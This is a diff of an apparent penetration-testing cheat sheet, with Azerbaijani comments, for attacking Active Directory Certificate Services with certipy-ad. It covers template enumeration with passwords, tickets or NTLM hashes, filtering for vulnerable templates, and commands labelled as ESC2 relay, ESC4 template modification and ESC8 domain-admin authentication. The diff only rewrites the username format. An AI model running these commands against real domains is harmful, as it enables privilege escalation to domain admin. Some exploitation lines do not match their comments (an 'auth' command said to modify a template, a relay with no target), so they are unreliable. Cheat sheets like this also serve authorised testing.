@@ -1,36 +1,36 @@
 
 # Domain admin və ya CA oxuma icazəsi olan hesabla
-certipy-ad find -u 'domain\\username' -p 'Password123' -dc-ip 10.10.10.10
-certipy-ad find -u 'lab\\pentester' -p 'Summer20!!' -dc-ip 10.11.1.10 -stdout
+certipy-ad find -u 'username@domain' -p 'Password123' -dc-ip 10.10.10.10
+certipy-ad find -u 'username@domain' -p 'Summer20!!' -dc-ip 10.11.1.10 -stdout
 
 # Kerberos ticket ilə (TGT lazımdır)
 certipy-ad find -dc-ip 10.10.10.10 -k
 
 # NTLM hash ilə
-certipy-ad find -u 'domain\\username' -hashes ':a1b2c3d4e5f6...' -dc-ip 10.10.10.10
+certipy-ad find -u 'username@domain' -hashes ':a1b2c3d4e5f6...' -dc-ip 10.10.10.10
 
 =======================================================================================================================================================================
 
 # Yalnız aktiv şablonlar
-certipy-ad find -enabled -u 'domain\\user' -p 'pass' -dc-ip 10.10.10.10
+certipy-ad find -enabled -u 'username@domain' -p 'pass' -dc-ip 10.10.10.10
 
 # Yalnız zəif şablonlar (ESC1, ESC2, ESC4 yolları)
-certipy-ad find -vulnerable -u 'domain\\user' -p 'pass' -dc-ip 10.10.10.10
-certipy-ad find -vulnerable -enabled -u 'lab\\pentester' -p 'Summer20!!' -dc-ip 10.11.1.10
+certipy-ad find -vulnerable -u 'username@domain' -p 'pass' -dc-ip 10.10.10.10
+certipy-ad find -vulnerable -enabled -u 'username@domain' -p 'Summer20!!' -dc-ip 10.11.1.10
 
 # DC-dən yalnız məlumat (Web Enrollment yox)
-certipy-ad find -dc-only -u 'domain\\user' -p 'pass' -dc-ip 10.10.10.10
+certipy-ad find -dc-only -u 'username@domain' -p 'pass' -dc-ip 10.10.10.10
 
 # OID-lərlə detallı məlumat
-certipy-ad find -oids -u 'domain\\user' -p 'pass' -dc-ip 10.10.10.10
+certipy-ad find -oids -u 'username@domain' -p 'pass' -dc-ip 10.10.10.10
 
 =======================================================================================================================================================================
 
 # ESC2 üçün relay/exploitation
-certipy-ad relay -u 'lab\\pentester' -p 'Summer20!!' 
+certipy-ad relay -u 'username@domain' -p 'Summer20!!' 
 
 # ESC4 üçün şablon düzəltmə
-certipy-ad auth -u 'lab\\admin' -p 'newpass' -template VulnerableTemplate
+certipy-ad auth -u 'username@domain' -p 'newpass' -template VulnerableTemplate
 
 # ESC8 üçün DA autentifikasiyası
-certipy-ad auth -pfx ./user.pfx -username lab\\DAuser
+certipy-ad auth -pfx ./user.pfx -username username@domain
